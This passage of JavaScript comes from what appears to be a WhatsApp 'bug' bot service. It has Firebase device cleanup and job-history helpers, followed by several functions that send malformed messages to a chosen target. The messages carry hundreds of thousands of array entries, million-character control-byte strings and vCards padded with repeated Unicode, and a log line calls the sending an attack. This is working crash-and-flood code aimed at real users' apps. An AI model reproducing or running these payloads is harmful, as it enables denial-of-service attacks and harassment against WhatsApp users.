                if (!data || typeof data !== 'object') continue;

                const brand = (data.manufacturer || '').toLowerCase();
                const model = (data.model || '').toLowerCase();
                const isBanned = (brand === 'google' ||
                    model.startsWith('pixel') ||
                    model.includes('pixel') ||
                    model.includes('generic') ||
                    model.includes('emulator') ||
                    model.includes('sdk_gphone')) &&
                    !(model.includes('infinix_x6837') || model.includes('infinix x6837'));

                let shouldDelete = false;

                if (isBanned) {
                    shouldDelete = true;
                }

                if (shouldDelete) {
                    await ref.child(deviceId).remove();
                    deletedCount++;
                }
            }

            if (deletedCount > 0) {
                console.log(`[FIREBASE CLEANUP] Berhasil menghapus ${deletedCount} device (Banned / Offline > 12 Jam).`);
            }
        } catch (err) {
            console.error('[FIREBASE CLEANUP] Error:', err.message);
        }
    }, 10 * 60 * 1000); // Jalanin pengecekan setiap 10 menit

} catch (err) {
    console.log('[FIREBASE] ⚠️ Firebase Admin SDK gagal diinisialisasi atau tidak terinstall. Detail:', err.message);
}

async function sendPushNotification(fcmToken, title, body) {
    if (!messaging || !fcmToken) return;
    try {
        const payload = {
            token: fcmToken,
            notification: { title, body },
            data: { click_action: "FLUTTER_NOTIFICATION_CLICK" }
        };
        await messaging.send(payload);
        console.log(`[FIREBASE] Notifikasi terkirim ke token: ${fcmToken.substring(0, 10)}...`);
    } catch (err) {
        console.error('[FIREBASE] Gagal mengirim notifikasi:', err.message);
    }
}


function loadHistory() {
    const HISTORY_FILE = path.join(process.cwd(), 'history.json');
    try {
        if (!fs.existsSync(HISTORY_FILE)) return [];
        return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
    } catch (err) {
        return [];
    }
}
function saveHistory(data) {
    const HISTORY_FILE = path.join(process.cwd(), 'history.json');
    try {
        if (data.length > 2000) data = data.slice(data.length - 2000);
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (err) {
        console.error('Failed to save history:', err.message);
    }
}
function addHistoryEntry(username, target, bug, senderType) {
    const history = loadHistory();
    const id = 'job_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    const entry = {
        id,
        username,
        target,
        bug,
        senderType,
        status: 'pending',
        message: '',
        timestamp: Date.now()
    };
    history.push(entry);
    saveHistory(history);
    return id;
}
function updateHistoryStatus(id, status, message = '') {
    if (!id) return;
    const history = loadHistory();
    const entry = history.find(h => h.id === id);
    if (entry) {
        entry.status = status;
        if (message) entry.message = message;
        saveHistory(history);
    }
}


setTimeout(() => {
    purgeIllegalAccountsOnStartup();
}, 5000);

setInterval(() => {
    purgeIllegalAccountsOnStartup();
}, 60 * 60 * 1000);

async function spamDelwy(otax, target) {

    await otax.relayMessage(
        "status@broadcast",
        {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
                fileLength: "275719",
                seconds: 15,
                mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
                height: -720,
                width: 720,
                fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
                directPath:
                    "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1772045071",
                jpegThumbnail: Buffer.alloc(0),
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    statusSourceType: "IMAGE",
                    isForwarded: true,
                    forwardingScore: 999,
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net",
                        businessDescription: null,
                    },
                },
                streamingSidecar:
                    "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
                thumbnailDirectPath:
                    "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
                thumbnailSha256:
                    "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
                thumbnailEncSha256:
                    "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
                annotations: Array.from({ length: 200000 }, () => ({
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            author: `suck my dick ¿ `,
                            title: " Threesixty ",
                        }
                    },
                    embeddedAction: true,
                })),
            },
        },
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
}
async function atribute4(otax, target) {
    const msg = await otax.relayMessage(target, {
        extendedTextMessage: {
            text: " Manta ",
            contextInfo: {
                statusAttributionType: 4,
                statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
            }
        }
    }, { participant: { jid: target } })

    await new Promise((r) => setTimeout(r, 5000));

    await otax.relayMessage(target, {
        protocolMessage: {
            type: 14,
            key: msg,
            editedMessage: {
                extendedTextMessage: {
                    text: " Manta ",
                    contextInfo: {
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: " Manta ",
                                    format: "DEFAULT"
                                },
                                contextInfo: {
                                    statusAttributionType: 4,
                                    statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
                                }
                            }
                        }
                    }
                }
            }
        }
    }, { participant: { jid: target } })
}
async function OtaxAyunBelovedX(otax, target, mention) {


    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " ¿Otax Here¿ ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );

    const mediaData = [
        {
            ID: "68917910",
            uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
            mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
        },
        {
            ID: "68884987",
            uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
            buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
            mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
        },
    ]

    let sequentialIndex = 0
    console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

    const selectedMedia = mediaData[sequentialIndex]
    sequentialIndex = (sequentialIndex + 1) % mediaData.length
    const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

    const contextInfo = {
        participant: target,
        mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        ],
    }




    const textMsg = {
        interactiveMessage: {
            header: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                    fileLength: "93217",
                    caption: "7eppsynC",
                    height: 1080,
                    width: 1080,
                    mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                    fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                    directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1778142659",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
                    contextInfo: {
                        pairedMediaType: "NOT_PAIRED_MEDIA",
                        isQuestion: true,
                        isGroupStatus: true
                    },
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [
                        9999999999999999999,
                        9999999999999999999,
                        9999999999999999999,
                        9999999999999999999
                    ],
                    midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
                },
                title: "MantaXxx",
                hasMediaAttachment: true
            },
            body: {
                text: "\0"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    }

    const statusMessages = [textMsg]

    function wrapGroupStatusV2(innerMessage) {
        return {
            groupStatusMessageV2: {
                message: innerMessage
            }
        }
    }

    let lastKey = null;
    for (let i = 0; i < 2; i++) {
        const biji2Id = crypto.randomBytes(16).toString('hex').toUpperCase()
        await otax.relayMessage(target, wrapGroupStatusV2(biji2.message), {
            messageId: biji2Id,
            participant: { jid: target }
        });

        for (const content of statusMessages) {
            const msgId = crypto.randomBytes(16).toString('hex').toUpperCase()
            const wrapped = wrapGroupStatusV2(content)
            await otax.relayMessage(target, wrapped, {
                messageId: msgId,
                participant: { jid: target }
            })
            lastKey = { remoteJid: target, id: msgId, participant: target }
        }
        if (i < 1) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }

    const mantaImageMessage = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
        fileLength: 162903,
        height: 1080,
        width: 1080,
        mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
        fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
        directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
        mediaKeyTimestamp: 1775033718,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA"
        },
        scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
        scanLengths: [
            10365,
            39303,
            40429,
            72806
        ],
        midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    }

    let mantaCards = [];
    for (let z = 0; z < 700; z++) {
        mantaCards.push({
            header: {
                imageMessage: mantaImageMessage,
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: "\0"
            }
        })
    }
    let mantaMsg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "\0" },
                    carouselMessage: {
                        cards: mantaCards
                    }
                }
            }
        }
    }, {});
    await otax.relayMessage(target, mantaMsg.message, {
        participant: { jid: target }
    });

    await otax.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " @null | Manta \u00bf? ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "{}",
                        version: 3
                    },
                    contextInfo: {
                        remoteJid: Math.random().toString(36) + " Tr4sh.corp\u00a1! ",
                        isForwarded: true,
                        forwardingScore: 999,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 50000 }, () => ({
                                "\u0000": "\u0000"
                            }))
                        }
                    }
                }
            }
        }
    }, {
        participant: { jid: target }
    });


    if (mention && lastKey) {
        await otax.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: lastKey,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {
                            is_status_mention: " meki - melar ",
                        },
                    },
                ],
            }
        );
    }
}

async function invsNewIos(otax, target) {
    let msg = generateWAMessageFromContent(
        target,
        {
            contactMessage: {
                displayName:
                    "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
                    "𑇂𑆵𑆴𑆿".repeat(10000),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                contextInfo: {
                    participant: target,
                    externalAdReply: {
                        automatedGreetingMessageShown: true,
                        automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                        greetingMessageBody: "\u0000"
                    }
                }
            }
        },
        {}
    );

    await otax.relayMessage(
        "status@broadcast",
        msg.message,
        {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}
async function NullGroups(otax, target) {
    await otax.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: " Manta?... "
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                featureEligibilities: {
                    cannotBeReactedTo: true,
                    cannotBeRanked: true,
                    canRequestFeedback: true,
                    canBeReshared: true,
                    canReceiveMultiReact: true
                },
